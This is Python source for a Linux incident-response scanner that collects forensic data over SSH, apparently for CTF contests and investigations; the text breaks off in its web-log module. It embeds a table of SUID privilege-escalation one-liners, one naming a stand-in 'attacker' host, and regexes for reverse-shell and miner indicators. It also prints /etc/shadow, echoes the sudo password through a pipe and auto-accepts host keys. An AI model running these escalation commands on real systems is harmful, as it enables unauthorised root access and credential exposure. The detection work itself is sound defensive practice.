#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Linux Automated Incidence Response Scanner
==========================================
Connects to a remote Linux host, runs 18 scanning modules
to collect forensic information for CTF IR competitions and
real-world security investigations.
"""

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime

import paramiko


class C:
    @staticmethod
    def red(s):
        return "\033[31m" + s + "\033[0m"
    @staticmethod
    def green(s):
        return "\033[32m" + s + "\033[0m"
    @staticmethod
    def yellow(s):
        return "\033[33m" + s + "\033[0m"
    @staticmethod
    def cyan(s):
        return "\033[36m" + s + "\033[0m"
    @staticmethod
    def bold(s):
        return "\033[1m" + s + "\033[0m"


def banner():
    art = r"""
   ____ ___  ____ _   _ _____ ___   ____ ___  _
  / ___/ _ \| __ ) | | | ____|_ _| / ___/ _ \| |
 | |  | | | |  _ \ |_| |  _|  | | | |  | | | | |
 | |__| |_| | |_) |  _  | |___ | | | |__| |_| | |___
  \____\___/|____/|_| |_|_____|___| \____\___/|_____|
   Incidence Response Scanner  -  18 Modules  -  v1.3
"""
    print(C.cyan(art))


# ============================================================
# 模块表
# ============================================================
MODULES = {
    1:  ('scan_system_info',     '系统信息'),
    2:  ('scan_network',         '网络连接与端口'),
    3:  ('scan_users',           '用户与登录记录'),
    4:  ('scan_processes',       '进程排查'),
    5:  ('scan_scheduled_tasks', '计划任务'),
    6:  ('scan_startup',         '启动项与持久化'),
    7:  ('scan_filesystem',      '文件系统异常'),
    8:  ('scan_hidden_flags',    '隐藏 Flag 搜索'),
    9:  ('scan_bash_history',    'Bash 历史'),
    10: ('scan_web_logs',        'Web 访问日志'),
    11: ('scan_webshell',        'Webshell 检测'),
    12: ('scan_database',        '数据库与配置'),
    13: ('scan_ssh_security',    'SSH 安全'),
    14: ('scan_pcap',            '流量包分析'),
    15: ('scan_malware',         '恶意软件检测'),
    16: ('scan_rootkit',         'Rootkit 检测'),
    17: ('scan_docker',          'Docker 容器'),
    18: ('generate_report',      '综合报告'),
}

SEV_ICON = {
    'HIGH':   ('[!]', 'red'),
    'MEDIUM': ('[?]', 'yellow'),
    'LOW':    ('[*]', 'cyan'),
    'INFO':   ('[+]', 'green'),
}

# ============================================================
# SUID 提权利用数据库 (GTFOBins 风格)
# key = basename, value = (提权命令示例, 说明)
# 仅包含不应正常拥有 SUID 的二进制
# ============================================================
SUID_GTFOBINS = {
    'find':      ('find . -exec /bin/sh -p \\;', 'exec 执行任意命令'),
    'python':    ("python -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'", 'os.execl 启动特权 shell'),
    'python3':   ("python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'", 'os.execl 启动特权 shell'),
    'perl':      ("perl -e 'exec \"/bin/sh\"'", 'exec 启动特权 shell'),
    'ruby':      ("ruby -e 'exec \"/bin/sh\"'", 'exec 启动特权 shell'),
    'php':       ("php -r 'pcntl_exec(\"/bin/sh\",[\"-p\"]);'", 'pcntl_exec 执行命令'),
    'node':      ('node -e \'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})\'', 'child_process 执行命令'),
    'nmap':      ('nmap --interactive  ->  !sh', '交互模式逃逸到 shell'),
    'bash':      ('bash -p', '-p 保留特权启动 shell'),
    'sh':        ('sh -p', '-p 保留特权启动 shell'),
    'dash':      ('dash -p', '-p 保留特权启动 shell'),
    'env':       ('env /bin/sh -p', '执行任意程序'),
    'cp':        ('cp /etc/shadow /tmp/sh; chmod 644 /tmp/sh', '复制敏感文件'),
    'mv':        ('mv 覆盖 /etc/passwd 或 /etc/shadow', '替换系统文件'),
    'less':      ('less /etc/passwd -> !/bin/sh', '逃逸到 shell'),
    'more':      ('more /etc/passwd -> !/bin/sh', '逃逸到 shell'),
    'man':       ('man man -> !/bin/sh', '逃逸到 shell'),
    'awk':       ("awk 'BEGIN{system(\"/bin/sh\")}'", 'system 执行命令'),
    'gawk':      ("gawk 'BEGIN{system(\"/bin/sh\")}'", 'system 执行命令'),
    'vim':       ('vim -c ":!/bin/sh"', '逃逸到 shell'),
    'vi':        ('vi -c ":!/bin/sh"', '逃逸到 shell'),
    'emacs':     ('emacs -Q -nw -> M-x shell', '逃逸到 shell'),
    'cpulimit':  ('cpulimit -l 100 -f /bin/sh', '执行任意程序'),
    'taskset':   ('taskset 1 /bin/sh -p', '执行任意程序'),
    'nice':      ('nice /bin/sh -p', '执行任意程序'),
    'timeout':   ('timeout 10 /bin/sh -p', '执行任意程序'),
    'nohup':     ('nohup /bin/sh -p', '执行任意程序'),
    'strace':    ('strace /bin/sh -p', '执行任意程序'),
    'ltrace':    ('ltrace /bin/sh -p', '执行任意程序'),
    'gdb':       ("gdb -nx -ex 'py import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'", '执行任意命令'),
    'base64':    ('base64 /etc/shadow', '读取任意文件'),
    'wget':      ('wget -O /etc/passwd http://attacker/passwd', '覆盖系统文件'),
    'curl':      ('curl file:///etc/shadow', '读取任意文件'),
    'tar':       ('tar cf /dev/null /dev/null --checkpoint-action=exec=/bin/sh', '执行命令'),
    'zip':       ('zip /tmp/x.zip /tmp/x -TT "/bin/sh #"', '执行命令'),
    'chmod':     ('chmod 4777 /bin/bash', '修改任意文件权限'),
    'chown':     ('chown attacker /etc/shadow', '修改任意文件属主'),
}

# 系统默认合法 SUID 文件 basename (CentOS/Ubuntu 常见默认项)
# 这些二进制正常情况下就拥有 SUID, 不告警
DEFAULT_SUID_WHITELIST = {
    'su', 'sudo', 'mount', 'umount', 'passwd', 'chage', 'chfn',
    'chsh', 'newgrp', 'gpasswd', 'expiry', 'at', 'crontab',
    'dbus-daemon-launch-helper', 'ssh-keysign', 'polkit-agent-helper-1',
    'dmcrypt-get-device', 'pam_timestamp_check', 'unix_chkpwd',
    'userhelper', 'usernetctl', 'mount.nfs', 'fusermount',
    'fusermount3', 'pkexec', 'snap-confine', 'bwrap',
    'Xorg.wrap', 'vboxclient', 'vmware-user-suid-wrapper',
    'ping', 'ping6', 'traceroute6.iputils', 'ntfs-3g',
    'doas', 'seunshare', 'lockdev', 'unix_update',
}

# ============================================================
# 核心扫描器
# ============================================================
class IRScanner:
    """Linux 应急响应扫描器"""

    def __init__(self, host, port, user, password, webroot=None, timeout=30):
        self.host = host
        self.port = port
        self.user = user
        self.password = password or ''
        self.webroot = webroot
        self.timeout = timeout
        self.client = None
        self.results = {}
        self.findings = []
        self.webroots = []
        self.start_time = time.time()
        self.scan_duration = 0.0
        self._is_root_user = None

    # ---------- 基础连接 ----------
    def connect(self):
        print(C.cyan("[*] 连接 %s:%s ..." % (self.host, self.port)))
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(
            self.host, port=self.port, username=self.user,
            password=self.password, timeout=self.timeout,
        )
        print(C.green("[+] SSH 连接成功\n"))
        self._is_root_user = (self.run('id -u 2>/dev/null').strip() == '0')

    def close(self):
        self.scan_duration = time.time() - self.start_time
        if self.client:
            self.client.close()
            self.client = None
        print(C.cyan("\n[*] SSH 连接已关闭 (扫描耗时 %.1fs)" % self.scan_duration))

    def run(self, cmd, timeout=None):
        """执行远程命令，返回合并后的 stdout+stderr 文本"""
        if not self.client:
            return ''
        try:
            stdin, stdout, stderr = self.client.exec_command(
                cmd, timeout=timeout or self.timeout)
            out = stdout.read().decode('utf-8', errors='replace')
            err = stderr.read().decode('utf-8', errors='replace')
        except Exception as e:
            return "[error] %s" % e
        if err:
            kept = []
            for line in err.splitlines():
                low = line.lower()
                if '[sudo]' in low or 'password for' in low:
                    continue
                if low.strip().startswith('sorry, try again'):
                    continue
                kept.append(line)
            err = '\n'.join(kept).strip()
        merged = out
        if err:
            merged += ('\n' if merged else '') + err
        return merged

    def sudo(self, cmd):
        """非 root 时用 sudo -S 包装命令"""
        if self._is_root_user:
            return cmd
        esc = "'" + self.password.replace("'", "'\\''") + "'"
        return "echo " + esc + " | sudo -S " + cmd

    # ---------- 输出 / 发现 辅助 ----------
    def _sec(self, num, title):
        print("\n" + "=" * 72)
        print(C.bold("  [%02d] %s" % (num, title)))
        print("=" * 72)

    def _pr(self, label, content, max_lines=50):
        content = (content or '').rstrip('\n')
        print(C.cyan("  [>] " + label))
        if not content.strip():
            print("      (empty)")
            return
        lines = content.splitlines()
        for ln in lines[:max_lines]:
            print("      " + ln)
        if len(lines) > max_lines:
            print("      [... 省略 %d 行]" % (len(lines) - max_lines))

    def _do(self, modkey, label, cmd, key=None, lines=50):
        """运行命令 -> 打印 -> 存入 self.results[modkey]"""
        out = self.run(self.sudo(cmd))
        k = key or label
        self.results.setdefault(modkey, {})[k] = out
        self._pr(label, out, max_lines=lines)
        return out

    def _find(self, severity, category, description, evidence=""):
        self.findings.append({
            'severity': severity,
            'category': category,
            'description': description,
            'evidence': (evidence or '')[:500],
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        })
        icon, color = SEV_ICON.get(severity, ('[*]', 'cyan'))
        print("  " + getattr(C, color)(
            icon + " [" + severity + "] " + description))
        if evidence:
            ev = evidence if len(evidence) <= 300 else evidence[:300] + " ..."
            print("        证据: " + ev)

    def _is_root(self):
        if self._is_root_user is not None:
            return self._is_root_user
        return self.run('id -u 2>/dev/null').strip() == '0'

    def _detect_webroot(self):
        """自动探测 Web 根目录"""
        roots = []
        cmd = (
            "for p in /www/wwwroot/* /var/www/html /var/www "
            "/usr/share/nginx/html /usr/local/nginx/html /opt/wwwroot "
            "/home/wwwroot /usr/local/apache/htdocs /opt/lampp/htdocs "
            "/www/wwwroot/default /www/wwwlogs/../wwwroot/* ; do "
            '[ -d "$p" ] && echo "$p"; done 2>/dev/null'
        )
        out = self.run(self.sudo(cmd))
        for line in out.splitlines():
            line = line.strip().rstrip('/')
            if line:
                roots.append(line)
        cmd2 = (
            "grep -rhoP '(?<=root[ \\t])\\S+' "
            "/etc/nginx/ /usr/local/nginx/conf/ /etc/httpd/ "
            "/etc/apache2/ /www/server/nginx/conf/ 2>/dev/null | "
            "sed 's/;$//' | sort -u"
        )
        out2 = self.run(self.sudo(cmd2))
        for line in out2.splitlines():
            line = line.strip().rstrip(';').rstrip('/')
            if line and line not in roots:
                roots.append(line)
        if roots:
            chk = "for p in " + " ".join('"' + r + '"' for r in roots) + " ; do " \
                  '[ -d "$p" ] && echo "$p"; done 2>/dev/null'
            out3 = self.run(self.sudo(chk))
            roots = [l.strip().rstrip('/') for l in out3.splitlines() if l.strip()]
        if self.webroot:
            w = self.webroot.rstrip('/')
            if w not in roots:
                roots.append(w)
        self.webroots = sorted(set(roots))
        return self.webroots

    # ============================================================
    # 模块 01: 系统信息
    # ============================================================
    def scan_system_info(self):
        mk = 'system_info'
        self._do(mk, '主机名', 'hostname')
        self._do(mk, '内核/系统', 'uname -a')
        self._do(mk, 'OS 发行版', 'cat /etc/os-release 2>/dev/null')
        self._do(mk, '运行时间', 'uptime')
        self._do(mk, '当前时间', 'date')
        self._do(mk, '在线用户 who', 'who')
        self._do(mk, '登录活动 w', 'w')
        self._do(mk, 'CPU 信息', 'lscpu 2>/dev/null | head -20')
        self._do(mk, '内存 free -m', 'free -m')
        self._do(mk, '磁盘 df -h', 'df -h')
        # 容器检测
        cgroup = self.run(self.sudo('cat /proc/1/cgroup 2>/dev/null'))
        self.results.setdefault(mk, {})['cgroup_1'] = cgroup
        self._pr('容器检测 (/proc/1/cgroup)', cgroup)
        is_container = bool(re.search(r'docker|lxc|kubepods', cgroup))
        if is_container:
            self._find('INFO', '容器', '检测到运行在容器环境中',
                       cgroup[:200])

    # ============================================================
    # 模块 02: 网络
    # ============================================================
    def scan_network(self):
        mk = 'network'
        self._do(mk, '监听端口', 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null')
        self._do(mk, '所有连接', 'ss -antp 2>/dev/null || netstat -antp 2>/dev/null')
        self._do(mk, '网卡接口', 'ip addr 2>/dev/null || ifconfig 2>/dev/null')
        self._do(mk, '路由表', 'ip route 2>/dev/null || route -n 2>/dev/null')
        self._do(mk, 'DNS 配置', 'cat /etc/resolv.conf 2>/dev/null')
        self._do(mk, '/etc/hosts', 'cat /etc/hosts 2>/dev/null')
        self._do(mk, 'iptables 规则', 'iptables -L -n 2>/dev/null')
        self._do(mk, 'firewalld', 'firewall-cmd --list-all 2>/dev/null')
        self._do(mk, 'ufw 状态', 'ufw status 2>/dev/null')
        self._do(mk, 'ARP 表', 'arp -an 2>/dev/null || ip neigh 2>/dev/null')

        listen = self.results.get(mk, {}).get('监听端口', '')
        danger_ports = {
            '6379': 'Redis',
            '27017': 'MongoDB',
            '9200': 'Elasticsearch',
            '11211': 'Memcached',
            '5900': 'VNC',
            '3306': 'MySQL',
        }
        for port, svc in danger_ports.items():
            # 逐行检查, 区分对外监听 vs 本地回环
            for line in listen.splitlines():
                if not re.search(r'[ :]' + port + r'\b', line):
                    continue
                # 本地回环地址 → LOW
                if re.search(r'\b127\.0\.0\.1\b.*:' + port + r'\b', line) or \
                   re.search(r'\[?::1\]?:' + port + r'\b', line):
                    self._find('LOW', '暴露服务',
                               '%s 端口 %s 仅本地监听' % (svc, port), line.strip())
                    break
                # 对外监听: 0.0.0.0 / *:port / [::]:port → HIGH
                if re.search(r'\b0\.0\.0\.0\b', line) or \
                   re.search(r'\*:' + port, line) or \
                   re.search(r'\[::\]:' + port, line) or \
                   re.search(r':::' + port, line):
                    self._find('HIGH', '暴露服务',
                               '%s 端口 %s 对外监听' % (svc, port), line.strip())
                    break

        ipt = self.results.get(mk, {}).get('iptables 规则', '')
        if re.search(r'policy\s+ACCEPT', ipt) and 'DROP' not in ipt:
            self._find('MEDIUM', '防火墙', 'iptables 默认策略为 ACCEPT', ipt[:200])
        fw = self.results.get(mk, {}).get('firewalld', '')
        if 'not running' in fw.lower() or 'inactive' in fw.lower():
            self._find('MEDIUM', '防火墙', 'firewalld 未运行', fw[:150])

        conn = self.results.get(mk, {}).get('所有连接', '')
        est = len(re.findall(r'ESTAB', conn))
        if est > 200:
            self._find('MEDIUM', '网络', 'ESTABLISHED 连接数异常(%d)' % est, conn[:200])

    # ============================================================
    # 模块 03: 用户与登录
    # ============================================================
    def scan_users(self):
        mk = 'users'
        self._do(mk, '/etc/passwd', 'cat /etc/passwd 2>/dev/null')
        self._do(mk, 'UID=0 账户', "awk -F: '$3==0{print $1}' /etc/passwd 2>/dev/null")
        self._do(mk, 'sudoers', 'cat /etc/sudoers 2>/dev/null; ls /etc/sudoers.d/ 2>/dev/null')
        self._do(mk, '特权组', 'getent group wheel root sudo admin 2>/dev/null')
        self._do(mk, 'last -50', 'last -50 2>/dev/null | head -50')
        self._do(mk, 'lastlog', 'lastlog 2>/dev/null')
        self._do(mk, '登录失败 lastb', 'lastb -20 2>/dev/null')
        self._do(mk, '7天内新建用户',
                 'awk -F: \'$3>=1000 && ($6+0)>(systime()-7*86400){print $1,$6}\' /etc/passwd 2>/dev/null')
        self._do(mk, '密码修改日志',
                 "grep -i 'password\\|passwd' /var/log/secure /var/log/auth.log 2>/dev/null | tail -30")
        # SSH authorized_keys for all users
        ak = self.run(self.sudo(
            'for d in $(awk -F: \'$3>=500{print $6}\' /etc/passwd); do '
            'f="$d/.ssh/authorized_keys"; [ -f "$f" ] && echo "== $f ==" && cat "$f"; done 2>/dev/null'))
        self.results.setdefault(mk, {})['authorized_keys'] = ak
        self._pr('用户 authorized_keys', ak)
        # /etc/shadow (root only)
        shadow = self.run(self.sudo('cat /etc/shadow 2>/dev/null'))
        self.results.setdefault(mk, {})['shadow'] = shadow
        self._pr('/etc/shadow', shadow, max_lines=30)

        uid0 = self.results.get(mk, {}).get('UID=0 账户', '')
        root_users = [l.strip() for l in uid0.splitlines() if l.strip()]
        if len(root_users) > 1:
            self._find('HIGH', '后门账户', '多个 UID=0 账户: %s' % ','.join(root_users), uid0)
        newu = self.results.get(mk, {}).get('7天内新建用户', '')
        if newu.strip():
            self._find('MEDIUM', '新建账户', '7天内新增用户账户', newu[:200])
        if ak.strip():
            self._find('INFO', 'SSH 公钥', '发现 SSH authorized_keys 文件', ak[:200])

    # ============================================================
    # 模块 04: 进程
    # ============================================================
    def scan_processes(self):
        mk = 'processes'
        self._do(mk, 'CPU Top20', 'ps aux --sort=-%cpu 2>/dev/null | head -21')
        self._do(mk, '内存 Top20', 'ps aux --sort=-%mem 2>/dev/null | head -21')
        self._do(mk, '进程列表', 'ps auxf 2>/dev/null | head -80')
        # 挖矿进程 (排除内核线程 [xxx] 形式, 避免 [crypto] 误报)
        mining = self.run(self.sudo(
            'ps aux 2>/dev/null | grep -iE '
            '"xmrig|minerd|kdevtmpfsi|kinsing|stratum|nicehash|cpuminer" '
            '| grep -v grep || '
            'ps aux 2>/dev/null | grep -iE "crypto" '
            '| grep -vE "grep|\\[.*\\]"'))
        self.results.setdefault(mk, {})['mining'] = mining
        self._pr('挖矿进程检测', mining)
        # 可疑进程
        susp = self.run(self.sudo(
            'ps aux 2>/dev/null | grep -iE '
            '"bash -i|/dev/tcp|nc -|ncat|socat|python -c|perl -e|'
            "0.0.0.0|while read|exec 5<|/dev/shm\" | grep -v grep"))
        self.results.setdefault(mk, {})['suspicious'] = susp
        self._pr('可疑进程', susp)
        # 已删除但运行中
        deleted = self.run(self.sudo(
            'ls -l /proc/*/exe 2>/dev/null | grep "(deleted)"'))
        self.results.setdefault(mk, {})['deleted_exes'] = deleted
        self._pr('已删除但运行中', deleted)
        # /tmp /dev/shm 可执行
        tmpexe = self.run(self.sudo(
            'find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null'))
        self.results.setdefault(mk, {})['tmp_executables'] = tmpexe
        self._pr('临时目录可执行文件', tmpexe)

        if mining.strip():
            self._find('HIGH', '挖矿', '发现挖矿相关进程', mining[:300])
        if susp.strip():
            self._find('HIGH', '反弹Shell', '发现可疑反弹Shell/后门进程', susp[:300])
        if deleted.strip():
            self._find('HIGH', '恶意进程', '存在已删除但仍在运行的进程(常见后门)', deleted[:300])
        if tmpexe.strip():
            self._find('MEDIUM', '临时可执行', '临时目录存在可执行文件', tmpexe[:300])

    # ============================================================
    # 模块 05: 计划任务
    # ============================================================
    def scan_scheduled_tasks(self):
        mk = 'scheduled_tasks'
        self._do(mk, 'root crontab', 'crontab -l 2>/dev/null')
        self._do(mk, '/etc/crontab', 'cat /etc/crontab 2>/dev/null')
        self._do(mk, '/etc/cron.d/', 'ls -la /etc/cron.d/ 2>/dev/null; for f in /etc/cron.d/*; do echo "== $f =="; cat "$f" 2>/dev/null; done')
        self._do(mk, '/var/spool/cron/', 'ls -la /var/spool/cron/ 2>/dev/null; for f in /var/spool/cron/*; do echo "== $f =="; cat "$f" 2>/dev/null; done')
        self._do(mk, 'cron.daily/hourly/others', 'ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null')
        self._do(mk, 'systemd timers', 'systemctl list-timers --all 2>/dev/null')
        self._do(mk, '所有用户 crontab',
                 'for u in $(cut -d: -f1 /etc/passwd); do c=$(crontab -u "$u" -l 2>/dev/null); [ -n "$c" ] && echo "== $u ==" && echo "$c"; done')
        self._do(mk, 'at 队列', 'atq 2>/dev/null')

        all_cron = ' '.join(str(v) for v in self.results.get(mk, {}).values())
        pat = re.compile(
            r'wget|curl|bash\s*-|nc\s+-|python\s+-c|perl\s+-e|chmod\s+\+x|'
            r'\|\s*sh|/tmp/|/dev/shm', re.I)
        if pat.search(all_cron):
            self._find('HIGH', '计划任务', '计划任务中存在可疑命令(下载/执行/反弹)', all_cron[:300])

    # ============================================================
    # 模块 06: 启动项与持久化
    # ============================================================
    def scan_startup(self):
        mk = 'startup'
        self._do(mk, 'rc.local', 'cat /etc/rc.local /etc/rc.d/rc.local 2>/dev/null')
        self._do(mk, 'systemd 启用服务', 'systemctl list-unit-files --state=enabled 2>/dev/null | head -40')
        self._do(mk, 'systemd 运行服务', 'systemctl list-units --type=service --state=running 2>/dev/null | head -40')
        self._do(mk, '/etc/init.d/', 'ls -la /etc/init.d/ 2>/dev/null')
        self._do(mk, '/etc/profile (tail)', 'tail -30 /etc/profile 2>/dev/null')
        self._do(mk, '/etc/environment', 'cat /etc/environment 2>/dev/null')
        self._do(mk, '/etc/bashrc', 'tail -30 /etc/bashrc /etc/bash.bashrc 2>/dev/null')
        self._do(mk, '用户 profiles',
                 'for d in $(awk -F: \'$3>=500{print $6}\' /etc/passwd); do '
                 'for n in .bashrc .bash_profile .profile; do f="$d/$n"; [ -f "$f" ] && echo "== $f ==" && cat "$f"; done; done 2>/dev/null',
                 lines=80)
        self._do(mk, 'ld.so.preload', 'cat /etc/ld.so.preload 2>/dev/null')
        self._do(mk, '内核模块 lsmod', 'lsmod 2>/dev/null')

        all_start = ' '.join(str(v) for v in self.results.get(mk, {}).values())
        if re.search(r'flag\{|ctf\{|FLAG\{', all_start):
            self._find('HIGH', 'Flag', '启动项中发现 flag{}', all_start[:300])
        if re.search(r'wget|curl|/dev/tcp|nc\s+-|python\s+-c|bash\s*-i', all_start, re.I):
            self._find('HIGH', '持久化', '启动项中存在可疑命令', all_start[:300])
        preload = self.results.get(mk, {}).get('ld.so.preload', '')
        if preload.strip():
            self._find('HIGH', 'Rootkit', 'ld.so.preload 非空(潜在 LD_PRELOAD rootkit)', preload[:200])

    # ============================================================
    # 模块 07: 文件系统
    # ============================================================
    def scan_filesystem(self):
        mk = 'filesystem'
        self._do(mk, '7天内修改文件',
                 'find / \\( -path /proc -o -path /sys -o -path /dev -o -path /run '
                 '-o -path /var/log -o -path /var/cache \\) -prune -o '
                 '-type f -mtime -7 -print 2>/dev/null | head -80',
                 lines=80)
        self._do(mk, '24小时内修改文件',
                 'find / \\( -path /proc -o -path /sys -o -path /dev -o -path /run '
                 '-o -path /var/log -o -path /var/cache \\) -prune -o '
                 '-type f -mtime -1 -print 2>/dev/null | head -60',
                 lines=60)
        self._do(mk, 'SUID 文件', 'find / -perm -4000 -type f 2>/dev/null')
        self._do(mk, 'SGID 文件', 'find / -perm -2000 -type f 2>/dev/null')
        self._do(mk, 'World-Writable 文件', 'find / -xdev -type f -perm -0002 2>/dev/null | grep -vE "^/proc|^/sys|^/dev|^/run" | head -60')
        self._do(mk, '/tmp 文件', 'ls -laR /tmp 2>/dev/null | head -40')
        self._do(mk, '/dev/shm 文件', 'ls -laR /dev/shm 2>/dev/null')
        self._do(mk, '/var/tmp 文件', 'ls -laR /var/tmp 2>/dev/null | head -40')
        self._do(mk, '异常位置 ELF', 'find /tmp /dev/shm /var/tmp /root /home -type f -exec file {} \\; 2>/dev/null | grep ELF')
        self._do(mk, 'rpm -Va', 'rpm -Va 2>/dev/null | head -40')
        self._do(mk, 'debsums -c', 'debsums -c 2>/dev/null | head -40')

        anom = self.results.get(mk, {}).get('异常位置 ELF', '')
        if anom.strip():
            self._find('HIGH', '恶意文件', '临时/用户目录存在 ELF 可执行文件', anom[:300])
        svf = self.results.get(mk, {}).get('rpm -Va', '')
        if re.search(r'\b(5|S\.M)\b', svf):
            self._find('MEDIUM', '完整性', 'rpm 校验发现系统文件被修改', svf[:300])

        # SUID 提权分析
        suid_raw = self.results.get(mk, {}).get('SUID 文件', '')
        dangerous_suids = []
        unknown_suids = []
        normal_count = 0
        for line in suid_raw.splitlines():
            path = line.strip()
            if not path or path == '(empty)':
                continue
            base = os.path.basename(path)
            if base in DEFAULT_SUID_WHITELIST:
                normal_count += 1
                continue
            if base in SUID_GTFOBINS:
                cmd, desc = SUID_GTFOBINS[base]
                dangerous_suids.append('%s  ->  %s  (%s)' % (path, cmd, desc))
            else:
                if re.match(r'^/(usr/(bin|sbin|lib|libexec)|bin|sbin)/', path):
                    unknown_suids.append('%s  (标准目录, 可能替换/新装)' % path)
                else:
                    unknown_suids.append('%s  (非标准目录, 高度可疑)' % path)

        print(C.cyan('  [>] SUID 分析: %d 正常 / %d 可提权 / %d 未知' % (
            normal_count, len(dangerous_suids), len(unknown_suids))))
        if dangerous_suids:
            ev = '\n'.join(dangerous_suids)
            self._find('HIGH', 'SUID 提权',
                       '发现可被利用提权的 SUID 文件 (%d 个)' % len(dangerous_suids), ev)
            print(C.red('  +-- SUID 提权风险:'))
            for d in dangerous_suids:
                print(C.red('  |   ' + d))
            print(C.red('  +--'))
        if unknown_suids:
            has_suspicious = any('非标准目录' in s for s in unknown_suids)
            sev = 'MEDIUM' if has_suspicious else 'LOW'
            self._find(sev, 'SUID 异常',
                       '发现非默认 SUID 文件 (%d 个)' % len(unknown_suids),
                       '\n'.join(unknown_suids))

    # ============================================================
    # 模块 08: 隐藏 Flag 搜索
    # ============================================================
    def scan_hidden_flags(self):
        mk = 'hidden_flags'
        # grep flag{ 大范围文件类型
        self._do(mk, 'grep flag{ 全局',
                 "grep -rl 'flag{' / --include='*.conf' --include='*.sh' --include='*.txt' "
                 "--include='*.php' --include='*.jsp' --include='*.py' --include='*.pl' "
                 "--include='*.env' --include='*.yml' --include='*.yaml' --include='*.xml' "
                 "--include='*.json' --include='*.ini' --include='*.cfg' --include='*.properties' "
                 "--include='*history*' --include='*.log' --include='*.md' --include='*.html' "
                 "2>/dev/null | grep -vE '^/proc|^/sys' | head -40",
                 lines=40)
        # flag 变体
        self._do(mk, 'flag 变体 ctf{/FLAG{/key{',
                 "grep -rIl -E '(ctf|FLAG|key)\\{' / --include='*.conf' --include='*.sh' --include='*.txt' "
                 "--include='*.php' --include='*.py' --include='*history*' 2>/dev/null | grep -vE '^/proc|^/sys' | head -20")
        # CTF 常见位置
        ctf_paths = [
            '/etc/profile', '/etc/rc.local', '/etc/rc.d/rc.local', '/etc/hosts',
            '/etc/resolv.conf', '/etc/environment', '/etc/crontab', '/etc/ld.so.preload',
            '/root/.bashrc', '/root/.bash_profile', '/etc/passwd', '/etc/shadow',
        ]
        for p in ctf_paths:
            content = self.run(self.sudo('cat "%s" 2>/dev/null' % p))
            if not content.strip():
                continue
            self.results.setdefault(mk, {})[p] = content
            hits = re.findall(r'(?:flag|ctf|FLAG|CTF|key|KEY)\{[^}]+\}', content)
            if hits:
                for h in hits:
                    self._find('HIGH', 'Flag', '在 %s 发现 %s' % (p, h), content[:200])

        # 常见目录 flag 内容
        flagdirs = ' '.join('"%s"' % d for d in (self.webroots or ['/etc', '/root', '/tmp']))
        self._do(mk, 'Web 目录 flag', "grep -rn -E '(flag|ctf|key)\\{' %s 2>/dev/null | head -30" % flagdirs, lines=30)

        # root-owned web 文件
        if self.webroots:
            rcmd = 'find ' + ' '.join(self.webroots) + ' -user root -type f 2>/dev/null | head -40'
            self._do(mk, 'root 属主 Web 文件', rcmd, lines=40)
            rfiles = self.results.get(mk, {}).get('root 属主 Web 文件', '')
            if rfiles.strip():
                self._find('MEDIUM', '权限', 'Web 目录存在 root 属主文件(可能被植入)', rfiles[:200])

        # 隐藏文件
        self._do(mk, '隐藏配置文件',
                 'find /etc /www /var/www /opt -name ".*" -type f 2>/dev/null | head -40')
        self._do(mk, '.htaccess', 'find / -name .htaccess -type f 2>/dev/null | head -20')
        self._do(mk, '.user.ini', 'find / -name .user.ini -type f 2>/dev/null | head -20')

    # ============================================================
    # 模块 09: Bash 历史
    # ============================================================
    def scan_bash_history(self):
        mk = 'bash_history'
        # 所有用户 bash_history (去重 home 目录避免重复读取)
        hist = self.run(self.sudo(
            'for d in $(cut -d: -f6 /etc/passwd | sort -u); do '
            'f="$d/.bash_history"; [ -f "$f" ] && echo "== $f ==" && cat "$f"; '
            'done 2>/dev/null'))
        self.results.setdefault(mk, {})['all_bash_history'] = hist
        self._pr('所有用户 .bash_history', hist, max_lines=120)
        # MySQL/Redis 历史
        self._do(mk, 'MySQL 历史', 'cat /root/.mysql_history /home/*/.mysql_history 2>/dev/null')
        redis_hist = self.run(self.sudo(
            'cat /root/.rediscli_history /home/*/.rediscli_history '
            '/var/lib/redis/.rediscli_history 2>/dev/null'))
        self.results.setdefault(mk, {})['redis_history'] = redis_hist
        self._pr('Redis 历史', redis_hist)

        # 按用户检查可疑模式
        cur_user = None
        susp_patterns = re.compile(
            r'wget|curl\s+.*\|\s*(sh|bash)|/dev/tcp|nc\s+-|socat|useradd|passwd\s|'
            r'chmod\s+777|rm\s+-rf\s+/|mysql\s+-u|redis-cli|crontab|'
            r'service\s+\w+\s+stop|systemctl\s+(stop|disable)|setenforce\s+0|'
            r'iptables\s+-F|ufw\s+disable|vim\s+/etc|vi\s+/etc|flag\{|base64\s+-d|'
            r'python\s+-c|perl\s+-e', re.I)
        for line in hist.splitlines():
            if line.startswith('== ') and line.endswith(' =='):
                cur_user = line
                continue
            if susp_patterns.search(line):
                self._find('MEDIUM', '历史命令',
                           '用户历史含可疑命令: %s' % line.strip(),
                           (cur_user or '') + ' -> ' + line.strip())

    # ============================================================
    # 模块 10: Web 访问日志
    # ============================================================
    def scan_web_logs(self):
        mk = 'web_logs'
        log_dirs = [
            '/www/wwwlogs/', '/var/log/nginx/', '/var/log/apache2/',
            '/var/log/httpd/', '/usr/local/nginx/logs/',
            '/usr/local/apache/logs/', '/export/wwwlogs/',
        ]
        find_cmd = ('find ' + ' '.join(log_dirs) + ' -type f '
                    '\\( -name "*.log" -o -name "*access*" \\) 2>/dev/null | head -30')
        files = self.run(self.sudo(find_cmd))
        self.results.setdefault(mk, {})['log_files'] = files
        self._pr('日志文件', files)

        file_list = [l.strip() for l in files.splitlines() if l.strip()][:12]
        for f in file_list:
            self._pr('日志: %s' % f, self.run(self.sudo('ls -lh "%s" 2>/dev/null' % f)))
            info = self.run(self.sudo(
                'echo "-- Top10 IP --"; awk \'{print $1}\' "%s" 2>/dev/null | '
                'sort | uniq -c | sort -rn | head -10; '
                'echo "-- Top10 URL --"; awk \'{print $7}\' "%s" 2>/dev/null | '
